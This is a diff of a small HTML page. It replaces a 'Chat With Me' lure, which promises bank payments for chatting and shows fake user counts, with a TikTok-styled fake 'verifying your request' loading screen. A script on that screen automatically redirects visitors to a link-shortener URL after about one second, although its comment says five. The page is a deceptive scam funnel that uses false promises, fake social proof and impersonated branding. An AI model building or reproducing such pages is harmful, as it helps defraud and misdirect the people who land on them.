@@ -491,11 +491,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Chat With Me</title>
+<title>Loading...</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
+
 *{
 margin:0;
 padding:0;
@@ -504,114 +505,170 @@ font-family:'Poppins',sans-serif;
 }
 
 body{
-background:#000;
+height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-min-height:100vh;
-padding:20px;
-color:#fff;
+background:#000;
+overflow:hidden;
+position:relative;
 }
 
-.container{
+/* TikTok Glow Background */
+
+body::before{
+content:'';
+position:absolute;
+width:400px;
+height:400px;
+background:#FE2C55;
+filter:blur(120px);
+top:-100px;
+right:-100px;
+opacity:.25;
+}
+
+body::after{
+content:'';
+position:absolute;
+width:400px;
+height:400px;
+background:#25F4EE;
+filter:blur(120px);
+bottom:-100px;
+left:-100px;
+opacity:.25;
+}
+
+.card{
+width:90%;
 max-width:420px;
-width:100%;
-background:#111;
-border-radius:24px;
-padding:30px;
+background:rgba(255,255,255,.06);
+backdrop-filter:blur(15px);
+border:1px solid rgba(255,255,255,.1);
+border-radius:25px;
+padding:40px 30px;
 text-align:center;
-box-shadow:0 15px 40px rgba(0,0,0,.4);
-border:1px solid rgba(255,255,255,.08);
+position:relative;
+z-index:10;
+box-shadow:0 20px 50px rgba(0,0,0,.5);
 }
 
-.badge{
-display:inline-block;
-padding:8px 16px;
-background:#fe2c55;
-border-radius:50px;
-font-size:13px;
-font-weight:600;
-margin-bottom:20px;
+.logo{
+font-size:40px;
+margin-bottom:15px;
+animation:float 2s ease-in-out infinite;
 }
 
 h1{
-font-size:32px;
-line-height:1.2;
-margin-bottom:15px;
+font-size:28px;
 font-weight:800;
+color:#fff;
+margin-bottom:12px;
 }
 
 p{
 color:#ccc;
-font-size:16px;
+font-size:15px;
 line-height:1.7;
 margin-bottom:25px;
 }
 
-.btn{
-display:block;
+.loader{
+width:70px;
+height:70px;
+margin:auto;
+border:5px solid rgba(255,255,255,.15);
+border-top:5px solid #FE2C55;
+border-radius:50%;
+animation:spin 1s linear infinite;
+}
+
+.progress{
 width:100%;
-padding:16px;
-background:#fe2c55;
-color:#fff;
-text-decoration:none;
-border-radius:14px;
-font-size:18px;
-font-weight:700;
-transition:.3s;
+height:8px;
+background:rgba(255,255,255,.1);
+border-radius:30px;
+overflow:hidden;
+margin-top:25px;
 }
 
-.btn:hover{
-transform:translateY(-2px);
+.progress-bar{
+height:100%;
+width:0%;
+background:linear-gradient(90deg,#25F4EE,#FE2C55);
+animation:load 5s linear forwards;
 }
 
-.trust{
-margin-top:20px;
-font-size:13px;
-color:#999;
-line-height:1.8;
-}
-
-.live{
-margin-top:20px;
-padding:12px;
-background:#1a1a1a;
-border-radius:12px;
+.status{
+margin-top:15px;
 font-size:14px;
 color:#25F4EE;
+font-weight:600;
+}
+
+@keyframes spin{
+100%{
+transform:rotate(360deg);
+}
+}
+
+@keyframes load{
+0%{
+width:0%;
+}
+100%{
+width:100%;
+}
+}
+
+@keyframes float{
+0%,100%{
+transform:translateY(0);
+}
+50%{
+transform:translateY(-8px);
+}
 }
 
 </style>
 </head>
 <body>
 
-<div class="container">
+<div class="card">
 
-<div class="badge">
-💬 Chat Opportunity
-</div>
+<div class="logo">🎵</div>
 
-<h1>Chat With Me ❤️</h1>
+<h1>Please Wait...</h1>
 
 <p>
-I'll reward you directly to your local bank just for chatting and making me feel happy.
+We're preparing your access now.<br>
+Please wait while we verify your request.
 </p>
 
-<a href="https://ln.run/Kro_f" class="btn">
-START NOW
-</a>
+<div class="loader"></div>
 
-<div class="trust">
-✅ Free to Start<br>
-✅ Mobile Friendly<br>
-✅ Quick Registration
+<div class="progress">
+<div class="progress-bar"></div>
 </div>
 
-<div class="live">
-🔥 127 people have already started today
+<div class="status">
+Redirecting...
 </div>
 
 </div>
+
+<script>
+
+// Change this to your destination URL
+const redirectURL = "https://ln.run/Kro_f";
+
+// Redirect after 5 seconds
+setTimeout(function(){
+window.location.href = redirectURL;
+},1000);
+
+</script>
 
 </body>
 </html>
